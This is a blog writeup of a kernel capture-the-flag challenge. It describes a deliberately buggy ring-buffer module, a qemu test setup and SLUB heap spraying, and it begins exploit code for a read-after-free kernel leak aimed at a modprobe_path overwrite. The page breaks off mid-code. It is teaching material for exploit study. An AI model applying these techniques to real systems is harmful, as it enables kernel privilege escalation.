<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Ringbus: Deferred Free Across Caches (Writeup)" /><meta property="og:locale" content="en" /><meta name="description" content="Writing to modprobe using bad ring buffer handlers. Official writeup for my RSTCON25 challenge." /><meta property="og:description" content="Writing to modprobe using bad ring buffer handlers. Official writeup for my RSTCON25 challenge." /><link rel="canonical" href="https://faultpoint.com/posts/ringbus/" /><meta property="og:url" content="https://faultpoint.com/posts/ringbus/" /><meta property="og:site_name" content="FaultPoint" /><meta property="og:image" content="https://faultpoint.com/assets/posts/2025-10-31/1.gif" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-10-31T00:00:00-04:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://faultpoint.com/assets/posts/2025-10-31/1.gif" /><meta property="twitter:title" content="Ringbus: Deferred Free Across Caches (Writeup)" /><meta name="twitter:site" content="@elbee_ez" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-11-08T14:44:46-05:00","datePublished":"2025-10-31T00:00:00-04:00","description":"Writing to modprobe using bad ring buffer handlers. Official writeup for my RSTCON25 challenge.","headline":"Ringbus: Deferred Free Across Caches (Writeup)","image":"https://faultpoint.com/assets/posts/2025-10-31/1.gif","mainEntityOfPage":{"@type":"WebPage","@id":"https://faultpoint.com/posts/ringbus/"},"url":"https://faultpoint.com/posts/ringbus/"}</script><title>Ringbus: Deferred Free Across Caches (Writeup) | FaultPoint</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/fp_logo_transparent.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">FaultPoint</a><p class="site-subtitle fst-italic mb-0">An assortment of vulnerability research, technical posts, and unfunny puns</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/elbee-cyber" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/elbee_ez" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dontopenthis','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Ringbus: Deferred Free Across Caches (Writeup)</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Ringbus: Deferred Free Across Caches (Writeup)</h1><p class="post-desc fw-light mb-4">Writing to modprobe using bad ring buffer handlers. Official writeup for my RSTCON25 challenge.</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1761883200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Oct 31, 2025 </time> </span> <span> Updated <time data-ts="1762631086" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Nov 8, 2025 </time> </span><div class="mt-3 mb-3"> <a href="/assets/posts/2025-10-31/1.gif" class="popup img-link preview-img shimmer"><img src="/assets/posts/2025-10-31/1.gif" alt="Preview Image" width="1200" height="630" loading="lazy"></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/elbee_ez">Dylan Knoff</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="3928 words" > <em>21 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Ringbus: Deferred Free Across Caches (Writeup)</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Ringbus: Deferred Free Across Caches (Writeup)</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>A writeup for the challenge I contributed to RSTCON25. The objective is to priv to root using kernel heap vulnerabilities, looping bugs, and heap spraying.</p><h1 id="table-of-contents">Table of contents</h1><ol><li><a href="#overview">Overview</a><li><a href="#module">Module and Exploit Considerations</a><li><a href="#environment">Environment Setup</a><li><a href="#slub">A Quick Primer on SLUB Exploitation</a><li><a href="#raf">Primitive 1: Read-after-free</a><li><a href="#aaw">Primitive 2: Type-Confusion to Overflow to AAW</a><li><a href="#trigger">Scan Devices and Trigger</a><li><a href="#closing">Closing Thoughts</a></ol><p><a name="overview"></a></p><h3 id="overview"><span class="me-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This is the official writeup for a kerenl challenge I developed for <a href="https://rstcon.org">RSTCON 2025</a> including coverage of the module, environment setup, as well as a general overview of SLUB exploitation, incase this is an unfamiliar topic. As usual, the remote runs a kernel with the module loaded and the user must exploit this module to achieve root privileges. This challenge tests your ability in obtaining kernel and cache leaks from heap primitives and spraying a target object into place in addition to abusing other bugs to achieve an AAW. The module simulates a serial manager which stores configuration settings and offers functions for a list of devices. Notably you can add many devices, each which contain their own ring buffer which can be RX/TX to. The goal of this challenge is to build up a primitive to hijack modprobe_path. Provided in this post is the <a href="/assets/posts/2025-10-31/dist.tar">dist.tar</a> incase you want to follow along. The module source is provided for this challenge.</p><p><a href="/assets/posts/2025-10-31/1.png" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/1.png" alt="" loading="lazy"></a></p><p><a name="module"></a></p><h3 id="module-and-exploit"><span class="me-2">Module and Exploit</span><a href="#module-and-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Looking at the source provided in <a href="/assets/posts/2025-10-31/dist.tar">dist.tar</a> reveals key information about the binary, considerations for exploitation, and a better overall picture as to what the module does and how it actually does it. Let’s go over some of the structures and handlers.</p><ul><li><code class="language-plaintext highlighter-rouge">struct devices</code><ul><li>Doubly linked list of <code class="language-plaintext highlighter-rouge">struct uart_ring</code>, the module uses this list to select (<code class="language-plaintext highlighter-rouge">dev_select</code>) and add (<code class="language-plaintext highlighter-rouge">dev_new</code>) devices.</ul><li><code class="language-plaintext highlighter-rouge">struct uart_ring</code><ul><li>Stores information about a device including a head, tail, and a seek used in TX/RX. It also includes usage metadata and options configurable by ioctls.</ul><li><code class="language-plaintext highlighter-rouge">get/add</code><ul><li>The former returns the <code class="language-plaintext highlighter-rouge">uart_ring</code> given the index, the latter adds a device at the end of the <code class="language-plaintext highlighter-rouge">devices</code> list.</ul><li><code class="language-plaintext highlighter-rouge">rx_handle</code><ul><li>Copies data from userspace into <code class="language-plaintext highlighter-rouge">selected_dev-&gt;head</code> the length copied is determined at runtime in the following manner:<ul><li>If the lengh n, provided in <code class="language-plaintext highlighter-rouge">write(,,n)</code> is less than <code class="language-plaintext highlighter-rouge">selected_dev-&gt;len</code>, then n is used. It is also validated that <code class="language-plaintext highlighter-rouge">selected_dev-&gt;len</code> is less than <code class="language-plaintext highlighter-rouge">RING_SIZE</code>.<li>Otherwise, selected_dev-&gt;len is used as a fallback size.</ul></ul><li><code class="language-plaintext highlighter-rouge">tx_handle</code><ul><li>Copies data from the selected device’s ring buffer into a userspace buffer, one byte at a time. This uses the <code class="language-plaintext highlighter-rouge">seek</code> attribute and will wrap back to the head if the end of the buffer is encountered. If the least significant nibble of <code class="language-plaintext highlighter-rouge">t_setting</code> for the selected device is enabled, a re-transmission mode will be enabled where TX will try on bytes that fail. Otherwise failed bytes will be skipped.</ul><li><code class="language-plaintext highlighter-rouge">ioctl RST</code><ul><li>Resets seek and marks the selected device as not in-use.</ul><li><code class="language-plaintext highlighter-rouge">ioctl LEN_SET</code><ul><li>Sets selected device’s length used for comparison (or as n) in <code class="language-plaintext highlighter-rouge">rx_handle</code>.</ul><li><code class="language-plaintext highlighter-rouge">ioctl tx_setting</code><ul><li>Sets <code class="language-plaintext highlighter-rouge">selected_dev-&gt;t_setting</code>.</ul></ul><p>That was quite a bit, but it is important to have atleast a general understanding of the module, the userspace interactions, and how it handles allocations with respect to the available userspace attack surface mappings. We know from this we are able to add an arbitrary amount of devices which allow us to read/write into allocations and in which the module itself decides whether to release a device or not. Knowing this, lets look at some of the deeper exploitation considerations that become apparent after looking at these functions and objects.</p><ul><li><code class="language-plaintext highlighter-rouge">rx_handle</code> does not wrap<ul><li>Unlike <code class="language-plaintext highlighter-rouge">tx_handle</code>, <code class="language-plaintext highlighter-rouge">rx_handle</code> will not wrap to the head if seek goes out of bounds and instead trusts the prior length validations to be safe.</ul><li><code class="language-plaintext highlighter-rouge">RST</code> deferred free<ul><li><code class="language-plaintext highlighter-rouge">RST</code> marks the selected device as no longer inuse, but does not actually free it at this time. This is done later either when RST is called again, or when RX/TX is called.</ul><li>Cache locations<ul><li>Both <code class="language-plaintext highlighter-rouge">devices</code> and <code class="language-plaintext highlighter-rouge">uart_ring-&gt;buf</code> are stored in <strong>kmalloc-cg-32</strong> while the <code class="language-plaintext highlighter-rouge">uart_ring</code> itself is allocated into <strong>kmalloc-cg-64</strong>. All allocations made by the program set <code class="language-plaintext highlighter-rouge">GFP_KERNEL_ACCOUNT</code>. It is important to know which caches interesting objects live in so that we are better prepared when we break the chains and start thrashing around in the SLABs.</ul><li><code class="language-plaintext highlighter-rouge">tx_handle</code> arbitrary looping<ul><li>An arbitrary loop can be toggled in <code class="language-plaintext highlighter-rouge">tx_handle</code> causing the function to continuously <code class="language-plaintext highlighter-rouge">copy_to_user</code>. This is done by setting <code class="language-plaintext highlighter-rouge">t_settings</code>. Likewise, the loop can also be exited arbitrarily.</ul><li><code class="language-plaintext highlighter-rouge">t_settings</code> unsigned long and controllable<ul><li>This attribute is an unsigned long type and entirely controllable, making it a perfect candidate for storing a fake address (such as for an AAW!). Recall, that this is a member of <code class="language-plaintext highlighter-rouge">uart_ring</code> so it lives in <strong>kmalloc-cg-64</strong>.</ul></ul><p>Keep these considerations in mind as we progress through our exploit. Next we’ll talk about environment setup, feel free to skip this section if you’ve done kernel challenges before.</p><p><a name="environment"></a></p><h3 id="environment-setup"><span class="me-2">Environment Setup</span><a href="#environment-setup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Unlike userspace binaries, for kernel modules we must emulate the kernel itself with the loaded target since bugs in our module can crash the kernel and the exploit primitives will heavily utilize kernelspace and kernel objects. The local environment you create for a kernel CTF is very similar to the environment being forked to you from the remote server. A local solve environment consists of a:</p><ul><li><code class="language-plaintext highlighter-rouge">bzImage</code><ul><li>The same kernel image being run on the remote. The image provided is non-stripped.</ul><li><code class="language-plaintext highlighter-rouge">initramfs</code><ul><li>The file system used by the emulation. Contains the target module and should have a modified <code class="language-plaintext highlighter-rouge">/init</code> to drop us in a root shell after booting. Here we can also mount a hostshare (which we will expose from qemu) so that we can directly access our exploits from our test environment without having to transfer our exploit each time.</ul><li>A script that launches our qemu environment</ul><p>From our launch script we can also toggle on and off mitigations such as nokaslr. The main thing we want in our testing environment is a way to be root (so we can read kallsyms) and a way to recompile and run our exploits without transferring it over the network. All you need to modify for this is <code class="language-plaintext highlighter-rouge">/init</code> in <code class="language-plaintext highlighter-rouge">initramfs</code> like so:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>...
<span class="nb">mkdir</span> /mnt/hostshare <span class="o">&amp;&amp;</span> mount <span class="nt">-t</span> 9p <span class="nt">-o</span> <span class="nv">trans</span><span class="o">=</span>virtio hostshare /mnt/hostshare
<span class="nb">exec </span>su <span class="nt">-l</span> root
</pre></table></code></div></div><p>You will need a script to <a href="/assets/posts/2025-10-31/decompress.sh">decompress</a> and <a href="/assets/posts/2025-10-31/rebuild-fs.sh">rebuild</a> the filesystem respectively, with our changes to init. You are also able to open a debugging port on your qemu instance using <code class="language-plaintext highlighter-rouge">-s</code>. Combined with our non-stripped vmlinux (which can be obtained from our bzImage using online tools), we are able to launch a rooted qemu instance and debug it with symbols locally. <a href="/assets/posts/2025-10-31/2.png" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/2.png" alt="" loading="lazy"></a></p><p>An example qemu launcher is given:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>

qemu-system-x86_64 <span class="se">\</span>
    <span class="nt">-m</span> 128M <span class="se">\</span>
    <span class="nt">-nographic</span> <span class="se">\</span>
    <span class="nt">-kernel</span> <span class="s2">"./bzImage"</span> <span class="se">\</span>
    <span class="nt">-append</span> <span class="s2">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr"</span> <span class="se">\</span>
    <span class="nt">-no-reboot</span> <span class="se">\</span>
    <span class="nt">-monitor</span> none <span class="se">\</span>
    <span class="nt">-cpu</span> qemu64,+smep,+smap <span class="se">\</span>
    <span class="nt">-initrd</span> <span class="s2">"./initramfs.cpio.gz"</span> <span class="se">\</span>
    <span class="nt">-fsdev</span> <span class="nb">local</span>,security_model<span class="o">=</span>passthrough,id<span class="o">=</span>fsdev0,path<span class="o">=</span>./src <span class="se">\</span>
    <span class="nt">-device</span> virtio-9p-pci,id<span class="o">=</span>fs0,fsdev<span class="o">=</span>fsdev0,mount_tag<span class="o">=</span>hostshare <span class="se">\</span>
    <span class="nt">-s</span>
</pre></table></code></div></div><blockquote class="prompt-tip"><p>pwndbg has some really easy to use slab commands, although they rely on symbols being present in your kernel.</p></blockquote><p><a name="slub"></a></p><h3 id="a-quick-primer-on-slub-exploitation"><span class="me-2">A Quick Primer on SLUB Exploitation</span><a href="#a-quick-primer-on-slub-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Given that this challenge relies on heap vulnerabilities, I think it would be useful to quickly go over some <a href="https://en.wikipedia.org/wiki/SLUB_(software)">SLUB</a> exploitation, which is the SLAB-based allocator used by the Linux kernel. While a kernel heap sounds scary, I personally find it easier than userland glibc-based heap exploitation. SLAB allocators are based on type and size caches and lack the complex best-fit, first-fit, remaindering, and other complex search paths and chunk carving that userland heap does to most optimally service a request. The underlying system design differences between the two allocator choices is apparent, where userland programs may allocate complex and indeterminable program-specific objects, the kernel is almost always limited to objects from the kernel and its subsystems, this also helps avoid fragmentation.</p><blockquote class="prompt-info"><p>Check out pwn.college’s series on kernel exploitation for some great resources on learning about slab allocators and the heap-specific protections in the linux kernel <a href="https://pwn.college/software-exploitation/kernel-exploitation">here</a>.</p></blockquote><p>In this short section, we will be discussing only some of allocator internals and exploitation techniques nessecary to complete this challenge. But below are some great resources I’ve found particularly helpful when it comes to kernel exploitation:</p><ul><li><a href="https://docs.google.com/presentation/d/1xJX9YiJNnzO0GgupZ8vvdznpjs0EJ55C3Rl_6WvmC2w/edit?pli=1&amp;slide=id.p#slide=id.p">pwn.college slide deck</a><li><a href="https://santaclz.github.io/2024/01/20/Linux-Kernel-Exploitation-Heap-techniques.html">Heap spraying and modprobe</a><li><a href="https://pawnyable.cafe/linux-kernel">Kernel pwn series</a><li><a href="https://github.com/google/security-research/blob/64cf5c30f22a3197d76d4056329c83576d61b567/analysis/kernel/heap-exploitation/InterestingObjects.ql">Codeql for finding useful kernel objects</a><li><a href="https://lookerstudio.google.com/reporting/68b02863-4f5c-4d85-b3c1-992af89c855c/page/n92nD">Kernel object searcher</a></ul><h4 id="kmalloc-caches"><span class="me-2">kmalloc caches</span><a href="#kmalloc-caches" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><code class="language-plaintext highlighter-rouge">kmalloc</code> returns locations from general-use caches, which are able to hold many different object types. While there are object-specific caches and caches that will be allocated to depending on the <code class="language-plaintext highlighter-rouge">kmalloc</code> flag, these general-use caches are used by all processes. Namely, caches are organized based on the sizes of their blocks (although as mentioned, dedicated caches are sorted based on other factors such as object similarity and isolation). For example, if I use a kernel object that is dynamically sized based on a custom attribute, it might live in the <code class="language-plaintext highlighter-rouge">kmalloc-32</code> cache if its headers alone are less than 32 bytes. However, if I rewrite that attribute, that same object might live in <code class="language-plaintext highlighter-rouge">kmalloc-512</code>!</p><blockquote class="prompt-info"><p>All slots for allocation in a cache slab are the fixed support size and no metadata is stored inline.</p></blockquote><p>Furthermore, unlike glibc’s <code class="language-plaintext highlighter-rouge">malloc</code>, <code class="language-plaintext highlighter-rouge">kmalloc</code> does not go through a complex flow map of where to cite a freed block given a variety of freelists and instead, freed slots are simply pushed onto the head of a single, singly linked freelist. If you’re curious about the caches available for servicing allocation requests you can read <code class="language-plaintext highlighter-rouge">/proc/slabinfo</code>.</p><h4 id="heap-spraying"><span class="me-2">Heap Spraying</span><a href="#heap-spraying" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Like any allocator, SLUB is reliant on its fair share of heap mitigations. Some of these include safe linking on freed chunks pointers, verification on <code class="language-plaintext highlighter-rouge">copy_to_user</code> and <code class="language-plaintext highlighter-rouge">copy_from_user</code> to avoid OOB writes, and freelist randomization. The last one is particularly interesting to us as it results in allocation patterns like this since contiguous slots are not guaranteed to be returned.</p><p><a href="/assets/posts/2025-10-31/3.png" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/3.png" alt="" loading="lazy"></a></p><p>This makes it particularly difficult to take advantage of use-after-free bugs, as we are not guaranteed the object we want, or anything at all, is residing in our victim chunk. Luckily, given the large amount of kernel objects available to us with their varying sizes, we can achieve many different exploitatable scenarios by simply mass-allocating a target object until they land in our UAFed slot. Some of these objects contain function pointers, kernel pointers, and cache pointers. <a href="https://devilinside.me/blogs/small-steps-kernel-exploitation">List of useful kernel objects</a></p><p><a href="/assets/posts/2025-10-31/4.png" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/4.png" alt="" loading="lazy"></a></p><p>Lastly, it is important to note that slabs for different caches do not live in adjacent memory, meaning I can’t spray into a region in <code class="language-plaintext highlighter-rouge">kmalloc-64</code> given a allocations made into <code class="language-plaintext highlighter-rouge">kmalloc-32</code> (atleast in simple scenarios, this can in fact be manually triggered, read more into <a href="https://kaligulaarmblessed.github.io/post/cross-cache-for-lazy-people">the padding spray method of cross-cache attacks</a>)</p><p><a name="raf"></a></p><h3 id="primitive-1-read-after-free"><span class="me-2">Primitive 1: Read-after-free</span><a href="#primitive-1-read-after-free" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now that we have a grasp on kernel heap exploitation, we can move on to our first primitive, which is a read-after-free. The first bug takes advantage of the deferred free in <code class="language-plaintext highlighter-rouge">RST</code> and the <code class="language-plaintext highlighter-rouge">copy_to_user</code> loop which can be triggered by setting the retransmission flag in <code class="language-plaintext highlighter-rouge">selected_device-&gt;t_settings</code> as mentioned earlier. A check is done at the beginning of the TX function to ensure the selected device has not been marked free by RST, but we are able to pass this check, trigger the loop, and then call RST on the device while it is still being read from. Specifically, we will continue reading from <code class="language-plaintext highlighter-rouge">selected_device-&gt;buf</code> (now freed) in a circular fashion. Note that to actually trigger the re-transmission loop, the setting has to be set <strong>in addition to the fact that the userspace address provided actually has to cause <code class="language-plaintext highlighter-rouge">copy_to_user</code> to fail.</strong> This could be done in a theoretically large number of ways such as by using <code class="language-plaintext highlighter-rouge">mprotect</code>, <code class="language-plaintext highlighter-rouge">madvise</code>, or by simply unmapping the buffer. We will use this vulnerability to leak a kernel address and a kmalloc-cg-64 address, thereby we will trigger it twice in our exploit.</p><p>Before proceeding, we need to add this new device to the module, select it, and configure it to fail.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Something"</span><span class="p">;</span>
<span class="n">leak_buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
<span class="kt">long</span> <span class="n">oob_dev</span><span class="p">;</span> <span class="c1">// used later</span>

<span class="c1">// Open and save fd</span>
<span class="n">open_device</span><span class="p">();</span>

<span class="c1">// Device 1</span>
<span class="c1">// - Bad t_settings</span>
<span class="n">fill_new_dev</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">TX_INSIST_MODE</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">leak_buf</code> will be used going forward to read all leaks.<li><code class="language-plaintext highlighter-rouge">oob_dev</code> will be used in the future for a different primitive.<li><code class="language-plaintext highlighter-rouge">fill_new_dev</code> adds a device and then writes data to it (a device can only be read from after it has been written too atleast once).<li>The last ioctl will cause retransmission (0x10 &amp; 0x1 != 1).</ul><p>I chose to leak a kernel address first. It should not matter what order you decide for your leaks, just be sure to account for it in the remainder of the exploit. Spraying devices second is more convenient here because we use the sprayed devices to craft a later primitive. The vulnerability can be triggered in the same way and the only factor that will realistically change is what object you choose to spray into the freed slot.</p><h4 id="seq_ops-spray-kernel-leak"><span class="me-2">seq_ops spray (Kernel Leak)</span><a href="#seq_ops-spray-kernel-leak" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>I chose to spray <code class="language-plaintext highlighter-rouge">seq_ops</code> to obtain the kernel leak. The first step to trigger this bug is to prepare our userspace <code class="language-plaintext highlighter-rouge">leak_buf</code> so that it is invalid or not writable, therefore causing <code class="language-plaintext highlighter-rouge">copy_to_user</code> to fail. We will then utilize a simple read thread to allow us to perform other interactions during the read loop. Here I simply use <code class="language-plaintext highlighter-rouge">mprotect</code> to remove permissions and then start the read thread.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1">// Disallow leak_buf so TX loop is triggered</span>
<span class="n">mprotect</span><span class="p">(</span><span class="n">leak_buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_NONE</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"[*] Starting read thread against unmapped region"</span><span class="p">);</span>
<span class="c1">// Read forever in a seperate thread</span>
<span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">read_tx</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">uaf_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</pre></table></code></div></div><p>As mentioned, the thread simply does:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="o">*</span><span class="nf">uaf_thread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
 <span class="n">printf</span><span class="p">(</span><span class="s">"UAF Thread"</span><span class="p">);</span>
 <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">leak_buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Now that we are in a read loop, we can free <code class="language-plaintext highlighter-rouge">selected_device-&gt;buf</code>. In the main thread, we call RST twice. The first time marks buf as not in use, the second frees it because it is already marked. RX/TX are solely responsibly for later reallocating buf if it is not in-use. This gives us a read-after-free since we have already passed that point in the code. We can take advantage of this by spraying an object into <code class="language-plaintext highlighter-rouge">kmalloc-cg-32</code> (recall buf is 32 bytes) until it lands in the freed slot and is eventually read back into <code class="language-plaintext highlighter-rouge">leak_buf</code> by the reader thread. I chose to spray with <code class="language-plaintext highlighter-rouge">sequence_ops</code> because it contains kernel points and lives in <code class="language-plaintext highlighter-rouge">kmalloc-cg-32</code>. Results of this clearly show that the <code class="language-plaintext highlighter-rouge">proc_single_show</code> symbol was leaked: <a href="/assets/posts/2025-10-31/5.png" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/5.png" alt="" loading="lazy"></a></p><p>Below is the code for this leak:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far 